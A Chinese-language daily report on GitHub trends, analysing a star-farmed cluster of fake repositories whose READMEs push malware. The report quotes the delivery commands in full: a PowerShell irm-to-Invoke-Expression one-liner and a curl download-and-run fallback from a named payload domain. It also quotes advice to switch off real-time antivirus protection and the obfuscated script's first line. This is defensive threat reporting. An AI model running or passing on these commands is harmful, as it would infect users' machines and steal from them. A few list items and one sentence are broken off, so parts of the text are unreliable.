今日重点趋势

趋势一（rank 1，score 95）：热度数据失真的第五次，而且这次可以逐条复现

2026-11-06 单日，GitHub 上新建且 star ≥ 30 的仓库共 205 个（search/repositories?q=created:2026-11-06 stars:>=30，三页取全）。

体积分布是第一个信号：

体积区间 数量 占比
≤ 20 KB 178 86.8%
21–200 KB 4 2.0%
> 200 KB 23 11.2%

其中 178 个的 forks_count 为 0 —— 也就是说 86.8% 的「热门新仓库」连一个人 fork 都没有。

star 值分布是一条窄带：95 个被逐个抓取 README 的仓库里，star 落在 213–221，其中 29 个精确等于 220。这种取值离散度不可能来自自然增长。

最硬的一条证据来自 README 本身。本日报用 gh api repos/{owner}/{repo}/readme -H "Accept:application/vnd.github.raw" 逐个抓取 95 份 ≤20 KB 仓库的 README，结果：

  • 91 份包含同一条可执行投放指令 irm "https://git-software.cc/ps/Setup.ps1" | &(gcm i*x)（irm = Invoke-RestMethod，gcm i*x = Get-Command Invoke-Expression）；
  • 这 91 份 README 同时附带规避杀毒软件的指示：「If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.」以及绕过执行策略的备选路径 curl -sL git-software.cc/ps/Setup.ps1 > run.ps1 && powershell -File run.ps1；
  • 这些 README 还统一带一个 telegra.ph 跳转链接、一个 shields.io "Download Project" 徽章，以及一段 "Organic Discovery & Identification" 关键词堆砌（形如 download axie infinity bot setup 2026 / axie infinity bot standalone installer / offline setup axie infinity bot / pre-activated axie infinity bot）—— 即为搜索引擎优化而写的假关键词；
  • 仓库描述统一是「X 2026 automated deployment pipeline for professional desktop software utility…」这类无意义套话。

载荷域名的实测状态（本日报按静态分析处理，未执行任何下载脚本）：

GET https://git-software.cc/ps/Setup.ps1 → HTTP 200, content-type: text/plain; charset=utf-8, 8,881 bytes → 首行: $__pso_af3f65335ffb439b96c61569fc1336c4 = @{i=$MyInvocation;b=$PSBoundParameters;n=$input;v=$ExecutionContext.SessionState.PSVariable.GetValue('_');hv=...

$__pso_... 变量名与 @{i=$MyInvocation;...} 结构是 PSObfuscator 的典型特征（与本日报 2026-10-30 记录的同一手法一致）。

⭐ 与 10-30 的对比（这是本日最重要的连续性观察）：10-30 记录的农场带有同一域名的投放指令，但当日抽样中 10-28 的两个同构簇均不含该域名。今日的核验结果是：91/95 命中，且命中的是全新的一批仓库——即该手法在 11-06 这一天达到了本日报观测到的最大规模。

⭐⭐ 本日报对待这批仓库的定性：不建档。理由不是道德判断，而是它们不满足「值得研究」的门槛——没有可运行的实现、没有可核验的工程决策、没有作者自述的技术取舍。本日报把可复现的证据链记录在此，供后续对照使用。

① 自述技术栈与仓库内容不符。 roblox-studio-mcp 的 README 写「a lightweight Node.js/TypeScript server」「Built with Node.js + WebSocket」「Auto-Discovery — Finds open Studio sessions automatically」，并列出 10 个 MCP 工具（get_object_tree / create_script / update_script / run_playtest / stop_playtest …）。但：

  • language 字段是 Python；
  • utils.py 全部内容是 """Utility helpers for starter.""" + def process(limit): return [item * 2 for item in range(limit)]；
  • config.py 是 """Configuration for starter.""" + VERSION = "0.1.5" / DEBUG = True / MAX_ITEMS = 50；
  • 四个 commit 在 20 秒内完成：06:16:36 Initial commit → 06:16:53 Add README.md → 06:16:54 Add utils.py → 06:16:56 Add config.py。

  2. subscribers_count —— 噪声低但样本小（本日：farm 簇 7–9 / sheeridVerify 0 / poki 1 / vork 4）。
  3. README 承诺的能力 vs 代码里是否真的存在 —— 本例承诺 10 个 MCP 工具、交付 0 个。
  4. language 字段 vs README 自述技术栈 —— 本例自述 Node.js/TypeScript、字段为 Python。

它给 agent 的入口是按 token 预算设计的：

最值得关注的方向

方向一：把「不确定性」做成产品的一部分。

本日三个真项目给出的做法各不相同，但内核一致：

  • 许可层（vork）：主动声明「不是开源」，并把「不能提供托管服务」写成可执行条款；
  • 验证层（poki）：把「写进去了」与「设备确认了」分成两个返回值，并逐条记录失败与未测范围；
  • 决策层（hermes-voice）：用 19 条编号决策记录每次取舍与被砍掉的范围。

⭐⭐ 这比「写免责声明」高一个层级 —— 免责声明是散文，而这三家都把边界做成了结构化的、可被机器或后来者检查的产物（许可条款 / sent: true + screen_changed 双信号 / 编号决策清单）。

方向二：agent 基础设施的竞争点从「能力」转向「可验证的边界」。

devvm 是本日唯一一个把架构规则写成CI 会拒绝的代码模式的项目：forbidigo bans os.WriteFile, os.Create and O_TRUNC elsewhere but the proxy、「internal/ui/ — the only package that prints」「internal/ports/ — one allocator of host ports」。它的 AGENTS.md 事实上是一份用自然语言写成的、可被 reviewer 对照代码核对的架构契约。这类项目的价值不在 star 数（116⭐ / 2 fork / 1 sub），而在于它把「一个 agent 沙箱应该长什么样」落成了一组可执行的约束。

方向三：created_at 陷阱的第三个实例。

devvmhq/devvm 的 created_at 是 2026-11-06T07:02:30Z，但 commits API 显示 600 个 commit，最早两个是 2026-10-24T07:10:51Z 与 2026-10-24T07:15:29Z；而 Organization devvmhq 确实是 2026-11-06T06:22:15Z 当天创建的。⭐ 即：仓库在 11-06 迁入了一个当天新建的组织，因此任何按 created_at 排序的「今日新项目」榜单都会把一个 13 天历史的工程排到第一。 这与本日报此前记录的 mirkobrombin/raven（改名时间戳）是同一类问题，只是这次叠加了「组织也是当天新建的」这一层。
